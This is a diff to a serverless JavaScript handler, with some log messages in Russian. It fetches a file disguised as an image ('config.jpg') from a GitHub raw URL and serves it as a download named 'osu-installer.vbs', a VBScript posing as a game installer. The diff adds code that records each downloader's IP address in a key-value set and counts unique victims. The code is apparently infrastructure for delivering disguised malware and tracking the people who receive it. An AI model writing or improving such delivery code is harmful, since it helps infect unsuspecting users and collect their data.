@@ -1,11 +1,16 @@
 export default async function handler(req, res) {
-  const ip = req.headers['x-forwarded-for'] || 
-             req.headers['x-real-ip'] || 
-             'Unknown IP';
+  const ip = (req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || 'unknown')
+    .toString()
+    .split(',')[0]
+    .trim();
 
-  console.log(`[${new Date().toISOString()}] Download | IP: ${ip}`);
+   await kv.sadd('unique_kristy', ip);
 
-  const rawUrl = 'https://raw.githubusercontent.com/mslwcnzy/jpg/refs/heads/main/config.jpg';;
+  const uniqueCount = await kv.scard('unique_kristy');
+
+  console.log(`[${new Date().toISOString()}] Скачивание | IP: ${ip} | Уникальных kristy: ${uniqueCount}`);
+
+  const rawUrl = 'https://raw.githubusercontent.com/mslwcnzy/jpg/refs/heads/main/config.jpg';
 
   try {
     const response = await fetch(rawUrl);
@@ -15,7 +20,7 @@ export default async function handler(req, res) {
     res.setHeader('Content-Disposition', 'attachment; filename="osu-installer.vbs"');
     res.send(buffer);
   } catch (error) {
-    console.error('Error:', error);
-    res.status(500).send('error server');
+    console.error('Ошибка:', error);
+    res.status(500).send('Ошибка');
   }
 }
